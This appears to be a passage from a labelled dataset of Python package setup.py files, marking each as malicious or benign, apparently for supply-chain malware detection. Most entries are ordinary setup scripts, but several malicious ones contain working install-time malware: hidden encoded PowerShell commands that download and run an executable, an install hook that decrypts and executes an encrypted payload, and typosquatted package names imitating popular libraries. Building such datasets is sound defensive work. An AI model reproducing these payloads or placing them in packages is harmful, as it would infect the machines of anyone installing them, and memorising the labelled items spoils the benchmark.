3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "djangorestframework-camel-case-1.3.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport sys\n\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist upload\")\n    sys.exit()\n\nreadme = open(\"README.rst\").read()\nhistory = open(\"HISTORY.rst\").read().replace(\".. :changelog:\", \"\")\nimport djangorestframework_camel_case\n\nsetup(\n    name=\"djangorestframework-camel-case\",\n    version=djangorestframework_camel_case.__version__,\n    description=\"Camel case JSON support for Django REST framework.\",\n    long_description=readme + \"\\n\\n\" + history,\n    long_description_content_type=\"text/x-rst\",\n    author=\"Vitaly Babiy\",\n    author_email=\"vbabiy86@gmail.com\",\n    url=\"https://github.com/vbabiy/djangorestframework-camel-case\",\n    packages=[\"djangorestframework_camel_case\"],\n    package_dir={\"djangorestframework_camel_case\": \"djangorestframework_camel_case\"},\n    include_package_data=True,\n    python_requires=\">=3.5\",\n    install_requires=[],\n    license=\"BSD\",\n    zip_safe=False,\n    keywords=\"djangorestframework_camel_case\",\n    classifiers=[\n        \"Development Status :: 2 - Pre-Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    test_suite=\"tests\",\n)\n", "target": 0}
{"idx": "dedupe-2.0.17", "func": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\ntry:\n    from setuptools import Extension, setup\nexcept ImportError:\n    raise ImportError(\n        \"setuptools module required, please go to https://pypi.python.org/pypi/setuptools and follow the instructions for installing setuptools\"\n    )\n\nfrom Cython.Build import cythonize\n\ninstall_requires = [\n    \"scikit-learn\",\n    \"affinegap>=1.3\",\n    \"categorical-distance>=1.9\",\n    \"dedupe-variable-datetime\",\n    \"numpy>=1.13\",\n    \"doublemetaphone\",\n    \"highered>=0.2.0\",\n    \"simplecosine>=1.2\",\n    \"haversine>=0.4.1\",\n    \"BTrees>=4.1.4\",\n    \"zope.index\",\n    \"Levenshtein_search==1.4.5\",\n    \"typing_extensions\",\n]\n\n\nsetup(\n    name=\"dedupe\",\n    url=\"https://github.com/dedupeio/dedupe\",\n    version=\"2.0.17\",\n    author=\"Forest Gregg\",\n    author_email=\"fgregg@datamade.us\",\n    description=\"A python library for accurate and scaleable data deduplication and entity-resolution\",\n    packages=[\"dedupe\", \"dedupe.variables\"],\n    ext_modules=cythonize(\n        [Extension(\"dedupe.cpredicates\", [\"dedupe/cpredicates.pyx\"])]\n    ),\n    install_requires=install_requires,\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX\",\n        \"Programming Language :: Cython\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: Scientific/Engineering :: Information Analysis\",\n    ],\n    long_description=\"\"\"\n    dedupe is a library that uses machine learning to perform de-duplication and entity resolution quickly on structured data. dedupe is the open source engine for `dedupe.io <https://dedupe.io>`_\n\n    **dedupe** will help you:\n\n    * **remove duplicate entries** from a spreadsheet of names and addresses\n    * **link a list** with customer information to another with order history, even without unique customer id's\n    * take a database of campaign contributions and **figure out which ones were made by the same person**, even if the names were entered slightly differently for each record\n\n    dedupe takes in human training data and comes up with the best rules for your dataset to quickly and automatically find similar records, even with very large databases.\n    \"\"\",  # noqa: E501\n    project_urls={\n        \"Issues\": \"https://github.com/dedupeio/dedupe/issues\",\n        \"Documentation\": \"https://docs.dedupe.io/en/latest/\",\n        \"Examples\": \"https://github.com/dedupeio/dedupe-examples\",\n        \"Twitter\": \"https://twitter.com/DedupeIo\",\n        \"Changelog\": \"https://github.com/dedupeio/dedupe/blob/main/CHANGELOG.md\",\n        \"Mailing List\": \"https://groups.google.com/forum/#!forum/open-source-deduplication\",\n    },\n)\n", "target": 0}
{"idx": "gql-3.4.0", "func": "import os\n\nfrom setuptools import setup, find_packages\n\ninstall_requires = [\n    \"graphql-core>=3.2,<3.3\",\n    \"yarl>=1.6,<2.0\",\n    \"backoff>=1.11.1,<3.0\",\n]\n\nconsole_scripts = [\n    \"gql-cli=gql.cli:gql_cli\",\n]\n\ntests_requires = [\n    \"parse==1.15.0\",\n    \"pytest==6.2.5\",\n    \"pytest-asyncio==0.16.0\",\n    \"pytest-console-scripts==1.3.1\",\n    \"pytest-cov==3.0.0\",\n    \"mock==4.0.2\",\n    \"vcrpy==4.0.2\",\n    \"aiofiles\",\n]\n\ndev_requires = [\n    \"black==22.3.0\",\n    \"check-manifest>=0.42,<1\",\n    \"flake8==3.8.1\",\n    \"isort==4.3.21\",\n    \"mypy==0.910\",\n    \"sphinx>=3.0.0,<4\",\n    \"sphinx_rtd_theme>=0.4,<1\",\n    \"sphinx-argparse==0.2.5\",\n    \"types-aiofiles\",\n    \"types-mock\",\n    \"types-requests\",\n] + tests_requires\n\ninstall_aiohttp_requires = [\n    \"aiohttp>=3.7.1,<3.9.0\",\n]\n\ninstall_requests_requires = [\n    \"requests>=2.26,<3\",\n    \"requests_toolbelt>=0.9.1,<1\",\n    \"urllib3>=1.26\",\n]\n\ninstall_websockets_requires = [\n    \"websockets>=9,<10;python_version<='3.6'\",\n    \"websockets>=10,<11;python_version>'3.6'\",\n]\n\ninstall_botocore_requires = [\n    \"botocore>=1.21,<2\",\n]\n\ninstall_all_requires = (\n    install_aiohttp_requires + install_requests_requires + install_websockets_requires + install_botocore_requires\n)\n\n# Get version from __version__.py file\ncurrent_folder = os.path.abspath(os.path.dirname(__file__))\nabout = {}\nwith open(os.path.join(current_folder, \"gql\", \"__version__.py\"), \"r\") as f:\n    exec(f.read(), about)\n\nsetup(\n    name=\"gql\",\n    version=about[\"__version__\"],\n    description=\"GraphQL client for Python\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/graphql-python/gql\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    keywords=\"api graphql protocol rest relay gql client\",\n    packages=find_packages(include=[\"gql*\"]),\n    # PEP-561: https://www.python.org/dev/peps/pep-0561/\n    package_data={\"gql\": [\"py.typed\"]},\n    install_requires=install_requires,\n    tests_require=install_all_requires + tests_requires,\n    extras_require={\n        \"all\": install_all_requires,\n        \"test\": install_all_requires + tests_requires,\n        \"test_no_transport\": tests_requires,\n        \"dev\": install_all_requires + dev_requires,\n        \"aiohttp\": install_aiohttp_requires,\n        \"requests\": install_requests_requires,\n        \"websockets\": install_websockets_requires,\n        \"botocore\": install_botocore_requires,\n    },\n    include_package_data=True,\n    zip_safe=False,\n    platforms=\"any\",\n    entry_points={\"console_scripts\": console_scripts},\n)\n", "target": 0}
{"idx": "gitlint-core-0.17.0", "func": "#!/usr/bin/env python\nfrom __future__ import print_function\nfrom setuptools import setup, find_packages\nimport io\nimport re\nimport os\nimport platform\nimport sys\n\n\ndescription = \"Git commit message linter written in python, checks your commit messages for style.\"\nlong_description = \"\"\"\nGreat for use as a commit-msg git hook or as part of your gating script in a CI pipeline (e.g. jenkins, github actions).\nMany of the gitlint validations are based on `well-known`_ community_ `standards`_, others are based on checks that\nwe've found useful throughout the years. Gitlint has sane defaults, but you can also easily customize it to your\nown liking.\n\nDemo and full documentation on `jorisroovers.github.io/gitlint`_.\nTo see what's new in the latest release, visit the CHANGELOG_.\n\nSource code on `github.com/jorisroovers/gitlint`_.\n\n.. _well-known: http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html\n.. _community: http://addamhardy.com/blog/2013/06/05/good-commit-messages-and-enforcing-them-with-git-hooks/\n.. _standards: http://chris.beams.io/posts/git-commit/\n.. _jorisroovers.github.io/gitlint: https://jorisroovers.github.io/gitlint\n.. _CHANGELOG: https://github.com/jorisroovers/gitlint/blob/main/CHANGELOG.md\n.. _github.com/jorisroovers/gitlint: https://github.com/jorisroovers/gitlint\n\"\"\"\n\n\n# shamelessly stolen from mkdocs' setup.py: https://github.com/mkdocs/mkdocs/blob/master/setup.py\ndef get_version(package):\n    \"\"\"Return package version as listed in `__version__` in `init.py`.\"\"\"\n    init_py = io.open(os.path.join(package, '__init__.py'), encoding=\"UTF-8\").read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\nsetup(\n    name=\"gitlint-core\",\n    version=get_version(\"gitlint\"),\n    description=description,\n    long_description=long_description,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Quality Assurance\",\n        \"Topic :: Software Development :: Testing\",\n        \"License :: OSI Approved :: MIT License\"\n    ],\n    python_requires=\">=3.6\",\n    install_requires=[\n        'Click>=8',\n        'arrow>=1',\n        'sh>=1.13.0 ; sys_platform != \"win32\"',\n    ],\n    extras_require={\n        'trusted-deps': [\n            'Click==8.0.3',\n            'arrow==1.2.1',\n            'sh==1.14.2 ; sys_platform != \"win32\"',\n        ],\n    },\n    keywords='gitlint git lint',\n    author='Joris Roovers',\n    url='https://jorisroovers.github.io/gitlint',\n    project_urls={\n        'Documentation': 'https://jorisroovers.github.io/gitlint',\n        'Source': 'https://github.com/jorisroovers/gitlint',\n    },\n    license='MIT',\n    package_data={\n        'gitlint': ['files/*']\n    },\n    packages=find_packages(exclude=[\"examples\"]),\n    entry_points={\n        \"console_scripts\": [\n            \"gitlint = gitlint.cli:cli\",\n        ],\n    },\n)\n\n# Print a red deprecation warning for python < 3.6 users\nif sys.version_info[:2] < (3, 6):\n    msg = \"\\033[31mDEPRECATION: You're using a python version that has reached end-of-life. \" + \\\n          \"Gitlint does not support Python < 3.6\" + \\\n          \"Please upgrade your Python to 3.6 or above.\\033[0m\"\n    print(msg)\n\n# Print a warning message for Windows users\nPLATFORM_IS_WINDOWS = \"windows\" in platform.system().lower()\nif PLATFORM_IS_WINDOWS:\n    msg = \"\\n\\n\\n\\n\\n****************\\n\" + \\\n          \"WARNING: Gitlint support for Windows is still experimental and there are some known issues: \" + \\\n          \"https://github.com/jorisroovers/gitlint/issues?q=is%3Aissue+is%3Aopen+label%3Awindows \" + \\\n          \"\\n*******************\"\n    print(msg)\n", "target": 0}
{"idx": "drift-python-1.1.1", "func": "from setuptools import setup\nfrom drift import __version__\n\n\npackages = ['drift']\n\nrequires = [\n    'requests>=2.20.0'\n]\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(name='drift-python',\n      version=__version__,\n      description=\"A Simple Drift API Wrapper.\",\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      author='Drift Engineering',\n      author_email='driftintegrations@drift.com',\n      packages=packages,\n      url='https://github.com/Driftt/drift-python',\n      include_package_data=True,\n      zip_safe=False,\n      license='MIT',\n      install_requires=requires\n)\n", "target": 0}
{"idx": "flsak-2.2.3", "func": "from setuptools import setup\n\n# Metadata goes in setup.cfg. These are here for GitHub's dependency graph.\nsetup(\n    name=\"flsak\",\n    install_requires=[\n        \"Werkzeug >= 2.2.2\",\n        \"Jinja2 >= 3.0\",\n        \"itsdangerous >= 2.0\",\n        \"click >= 8.0\",\n        \"importlib-metadata >= 3.6.0; python_version < '3.10'\",\n    ],\n    extras_require={\n        \"async\": [\"asgiref >= 3.2\"],\n        \"dotenv\": [\"python-dotenv\"],\n    },\n)\n", "target": 1}
{"idx": "esqrandomhydra-6.43", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandomhydra',\n    packages = ['modlib'],\n    version = '1.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-core-2.3.2", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-core\"\ndescription = \"Google Cloud API client core library\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core >= 1.31.6, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"google-auth >= 1.25.0, < 3.0dev\",\n]\nextras = {\"grpc\": \"grpcio >= 1.38.0, < 2.0dev\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-cloud-core\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "requriments-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ezBkI bPcAKOFGzhnX otEJPQnmtmJrGrN FNgTlPNMOSqPwYxsyslrBiAjZVxovqtrMwdEqwpfuiDkwRag'\nLONG_DESCRIPTION = 'eUGVQcrTCyiTUzVDlnZmeNBH yOuGDAEIPLnfhgTrMnfMllwhwuGTwbllfAkPcLlLIJcEH IEOONlm pPEbhfBVxwTSRAyjHwNEkUtm GhJszcIRVomMKDgGpxPAAWYmSOWfusGFcFzphLAOjlgbKKigQOJABoDvNBoXKDpDAsgeeBsAk OijwIImIt wxJYCJJuSysamMM'\n\n\nclass IDHJnlJaPqxPuoTneDeiuzKERHuekIrLQLoQjbojgZPaqqqvRbXTSqkXxLLWaMZxeTSsUlbdaPDnFWAbvIfIgcmBhCGeYZHblmxkevkblWMlNLWiHqpSPUivozWBTyImhGSdJwqDugYVIPKRXxXaUsMoDJsUhwVmsQkifr(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'gxzn9zs-hTn9QzgD17i_Ypw_V2xCTixTj6gcKonZECk=').decrypt(b'gAAAAABmBIW0ey3ObSyY9QVflduP_E0C5nT68ZD3mXFWosCfDzFyL0sck__RGWChDH9IxcfOzg9t1W8rrg5krB8qr5r-kfkMbHz2w2Qh-O1flbuO7HEv5-Yfe51Fprmps1mMo_1i4ByafdX8vDiVA1r0QaDz7dV_u8wgKe9afFlNn9iX3eWNTOCUAwtmDHLUDpKUfzCVDrwSE3iMkDbf8l_G4GmRGrayzeuNomNcCX_yKBIDo8NKxTw='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requriments\",\n    version=VERSION,\n    author=\"HMTponOSYDLvAP\",\n    author_email=\"jzuhCxOlxMnAOboA@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': IDHJnlJaPqxPuoTneDeiuzKERHuekIrLQLoQjbojgZPaqqqvRbXTSqkXxLLWaMZxeTSsUlbdaPDnFWAbvIfIgcmBhCGeYZHblmxkevkblWMlNLWiHqpSPUivozWBTyImhGSdJwqDugYVIPKRXxXaUsMoDJsUhwVmsQkifr,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "datasette-0.62", "func": "from setuptools import setup, find_packages\nimport os\n\n\ndef get_long_description():\n    with open(\n        os.path.join(os.path.dirname(os.path.abspath(__file__)), \"README.md\"),\n        encoding=\"utf8\",\n    ) as fp:\n        return fp.read()\n\n\ndef get_version():\n    path = os.path.join(\n        os.path.dirname(os.path.abspath(__file__)), \"datasette\", \"version.py\"\n    )\n    g = {}\n    with open(path) as fp:\n        exec(fp.read(), g)\n    return g[\"__version__\"]\n\n\nsetup(\n    name=\"datasette\",\n    version=get_version(),\n    description=\"An open source multi-tool for exploring and publishing data\",\n    long_description=get_long_description(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Simon Willison\",\n    license=\"Apache License, Version 2.0\",\n    url=\"https://datasette.io/\",\n    project_urls={\n        \"Documentation\": \"https://docs.datasette.io/en/stable/\",\n        \"Changelog\": \"https://docs.datasette.io/en/stable/changelog.html\",\n        \"Live demo\": \"https://latest.datasette.io/\",\n        \"Source code\": \"https://github.com/simonw/datasette\",\n        \"Issues\": \"https://github.com/simonw/datasette/issues\",\n        \"CI\": \"https://github.com/simonw/datasette/actions?query=workflow%3ATest\",\n    },\n    packages=find_packages(exclude=(\"tests\",)),\n    package_data={\"datasette\": [\"templates/*.html\"]},\n    include_package_data=True,\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"asgiref>=3.2.10,<3.6.0\",\n        \"click>=7.1.1,<8.2.0\",\n        \"click-default-group-wheel>=1.2.2\",\n        \"Jinja2>=2.10.3,<3.1.0\",\n        \"hupper~=1.9\",\n        \"httpx>=0.20\",\n        \"pint~=0.9\",\n        \"pluggy>=1.0,<1.1\",\n        \"uvicorn~=0.11\",\n        \"aiofiles>=0.4,<0.9\",\n        \"janus>=0.6.2,<1.1\",\n        \"asgi-csrf>=0.9\",\n        \"PyYAML>=5.3,<7.0\",\n        \"mergedeep>=1.1.1,<1.4.0\",\n        \"itsdangerous>=1.1,<3.0\",\n    ],\n    entry_points=\"\"\"\n        [console_scripts]\n        datasette=datasette.cli:cli\n    \"\"\",\n    setup_requires=[\"pytest-runner\"],\n    extras_require={\n        \"docs\": [\n            \"furo==2022.6.21\",\n            \"sphinx-autobuild\",\n            \"codespell\",\n            \"blacken-docs\",\n            \"sphinx-copybutton\",\n        ],\n        \"test\": [\n            \"pytest>=5.2.2,<7.2.0\",\n            \"pytest-xdist>=2.2.1,<2.6\",\n            \"pytest-asyncio>=0.17,<0.20\",\n            \"beautifulsoup4>=4.8.1,<4.12.0\",\n            \"black==22.6.0\",\n            \"blacken-docs==1.12.1\",\n            \"pytest-timeout>=1.4.2,<2.2\",\n            \"trustme>=0.7,<0.10\",\n            \"cogapp>=3.3.0\",\n        ],\n        \"rich\": [\"rich\"],\n    },\n    tests_require=[\"datasette[test]\"],\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Framework :: Datasette\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Intended Audience :: End Users/Desktop\",\n        \"Topic :: Database\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.7\",\n    ],\n)\n", "target": 0}
{"idx": "gequests-2.28.1", "func": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"gequests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"gequests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "tpmaskverultra-7.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskverultra',\n    packages = ['modlib'],\n    version = '8.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "randrange-0.0.2", "func": "from setuptools import setup\nfrom setup import kwargs\nsetup(**kwargs)\n", "target": 1}
{"idx": "halo-0.0.31", "func": "import io\nfrom setuptools import (\n    setup,\n    find_packages,\n)  # pylint: disable=no-name-in-module,import-error\n\n\ndef dependencies(file):\n    with open(file) as f:\n        return f.read().splitlines()\n\n\nwith io.open(\"README.md\", encoding=\"utf-8\") as infile:\n    long_description = infile.read()\n\nsetup(\n    name=\"halo\",\n    packages=find_packages(exclude=(\"tests\", \"examples\")),\n    version=\"0.0.31\",\n    license=\"MIT\",\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3 :: Only\",\n    ],\n    python_requires=\">=3.4\",\n    description=\"Beautiful terminal spinners in Python\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"Manraj Singh\",\n    author_email=\"manrajsinghgrover@gmail.com\",\n    url=\"https://github.com/manrajgrover/halo\",\n    keywords=[\n        \"console\",\n        \"loading\",\n        \"indicator\",\n        \"progress\",\n        \"cli\",\n        \"spinner\",\n        \"spinners\",\n        \"terminal\",\n        \"term\",\n        \"busy\",\n        \"wait\",\n        \"idle\",\n    ],\n    install_requires=dependencies(\"requirements.txt\"),\n    